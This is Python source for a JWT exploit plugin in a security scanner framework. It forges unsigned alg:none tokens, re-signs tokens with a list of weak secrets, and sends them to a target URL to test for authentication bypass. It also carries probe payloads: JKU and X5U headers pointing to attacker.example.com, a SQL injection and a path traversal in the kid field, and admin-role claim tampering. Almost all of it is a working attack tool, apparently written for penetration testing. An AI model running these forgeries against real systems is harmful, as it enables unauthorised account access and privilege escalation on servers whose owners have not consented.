"""
JWT (JSON Web Token) Exploit Plugin

Provides exploit capabilities for JWT security issues:
- alg:none attack (removing signature)
- RS256 â†’ HS256 key confusion
- Weak secret brute-force
- Token forgery PoC
"""

import sys
import os
import base64
import json
import hmac
import hashlib
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

WEAK_SECRETS = [
    'secret', 'password', '123456', 'changeme', 'supersecret',
    'jwt_secret', 'myapp_secret', 'dev_secret', 'test', '',
    'qwerty', 'abc123', 'letmein', 'admin', 'root',
    'key', 'private', 'jwt', 'token', 'auth',
    'secret123', 'password123', 'mysecret', 'app_secret', 'access',
    'default', 'master', 'welcome', 'secure', 'keykey',
]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.urlsafe_b64decode(s)


def _forge_none_alg(token: str) -> Optional[str]:
    """Return a version of the token signed with alg:none."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        header = json.loads(_b64url_decode(parts[0]))
        header['alg'] = 'none'
        new_header = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None


def _forge_hs256(token: str, secret: str) -> Optional[str]:
    """Re-sign a token with HS256 and the given secret."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        header = json.loads(_b64url_decode(parts[0]))
        header['alg'] = 'HS256'
        new_header = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        signing_input = f"{new_header}.{parts[1]}".encode()
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        return f"{new_header}.{parts[1]}.{_b64url_encode(sig)}"
    except Exception:
        return None


class JWTExploitPlugin(ExploitPlugin):
    """JWT security exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'jwt'

    @property
    def name(self) -> str:
        return 'JWT Exploit'

    @property
    def description(self) -> str:
        return 'JSON Web Token exploit plugin: alg:none, key confusion, weak secret brute-force.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate forged JWT tokens and probe payloads."""
        context = context or {}
        token = context.get('token', '')
        payloads = []
        if token:
            none_token = _forge_none_alg(token)
            if none_token:
                payloads.append(none_token)
            for secret in WEAK_SECRETS:
                forged = _forge_hs256(token, secret)
                if forged:
                    payloads.append(forged)

        # Always include generic probe payloads for detection/testing
        generic_payloads = [
            # alg:none probe tokens with empty payload
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.',
            'eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.',
            'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.',
            # Expired token reuse probes
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxfQ.invalid',
            # Claim tampering probes
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.invalid',
            # JKU injection probe
            '{"alg":"RS256","jku":"https://attacker.example.com/jwks.json"}',
            # X5U injection probe
            '{"alg":"RS256","x5u":"https://attacker.example.com/cert.pem"}',
            # Kid injection probe (SQL)
            '{"alg":"HS256","kid":"1 UNION SELECT secret FROM users-- -"}',
            # Kid injection probe (path traversal)
            '{"alg":"HS256","kid":"../../dev/null"}',
            # Empty secret HS256
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.',
        ]
        # Add forged tokens with all weak secrets for generic testing
        dummy_token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ'
        for secret in WEAK_SECRETS[:10]:
            try:
                signing_input = dummy_token.encode()
                sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                forged = f"{dummy_token}.{_b64url_encode(sig)}"
                generic_payloads.append(forged)
            except Exception:
                pass

        payloads.extend(generic_payloads)
        return payloads if payloads else ['<provide a JWT token in context[\'token\']>']

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Attempt JWT attacks: alg:none and weak secret brute-force."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'jwt',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        token = vulnerability_data.get('token') or config.get('token', '')

        if not token:
            return {
                'success': False,
                'error': 'No JWT token provided in vulnerability_data or config',
                'vulnerability_type': 'jwt',
            }

        # Try alg:none attack
        none_token = _forge_none_alg(token)
        if none_token:
            try:
                headers = {'Authorization': f'Bearer {none_token}'}
                resp = requests.get(target_url, headers=headers, timeout=timeout,
                                    verify=verify_ssl, allow_redirects=False)
                if resp.status_code in (200, 201, 202):
                    return {
                        'success': True,
                        'vulnerability_type': 'jwt',
                        'attack': 'alg_none',
                        'forged_token': none_token,
                        'evidence': f'Server accepted alg:none token (HTTP {resp.status_code})',
                        'message': 'JWT alg:none attack confirmed',
                    }
            except Exception as e:
                logger.debug(f"alg:none attack error: {e}")

        # Try weak secret brute-force
        for secret in WEAK_SECRETS:
            forged = _forge_hs256(token, secret)
            if not forged:
                continue
            try:
                headers = {'Authorization': f'Bearer {forged}'}
                resp = requests.get(target_url, headers=headers, timeout=timeout,
                                    verify=verify_ssl, allow_redirects=False)
                if resp.status_code in (200, 201, 202):
                    return {
                        'success': True,
                        'vulnerability_type': 'jwt',
                        'attack': 'weak_secret',
                        'secret': secret,
                        'forged_token': forged,
                        'evidence': f'Weak JWT secret "{secret}" confirmed (HTTP {resp.status_code})',
                        'message': 'JWT weak secret confirmed',
                    }
            except Exception as e:
                logger.debug(f"Weak secret brute-force error (secret={secret!r}): {e}")

        return {
            'success': False,
            'error': 'No JWT attack succeeded',
            'vulnerability_type': 'jwt',
        }
